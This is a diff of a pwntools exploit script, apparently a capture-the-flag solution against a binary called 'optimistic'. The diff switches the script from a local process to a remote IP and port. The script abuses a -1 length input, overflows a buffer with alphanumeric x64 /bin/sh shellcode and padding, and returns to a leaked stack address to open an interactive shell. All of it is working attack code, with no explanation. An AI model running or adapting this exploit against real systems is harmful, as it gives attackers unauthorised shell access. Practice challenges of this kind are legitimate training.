@@ -8,8 +8,8 @@ padding_length = 104
 ret_offset = -96
 
 log.info('Create IO')
-#io = remote('', )
-io = process('/home/kali/Downloads/optimistic_patched')
+io = remote('46.101.86.208', 32257)
+#io = process('/home/kali/Downloads/optimistic_patched')
 
 
 log.info('Get Stack Address')
@@ -27,6 +27,7 @@ io.sendlineafter(': ', 'age')
 log.info('Send Name Lenght')
 io.sendlineafter(': ', '-1')
 
+#payload = cyclic(200)
 #Alphanumeric Shellcode x64 /bin/sh
 #https://www.exploit-db.com/exploits/35205
 shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
@@ -37,6 +38,5 @@ payload = shellcode + padding + p64(stack_address)
 
 log.info('Send payload to name')
 io.sendlineafter('Name: ', payload)
-
 
 io.interactive()
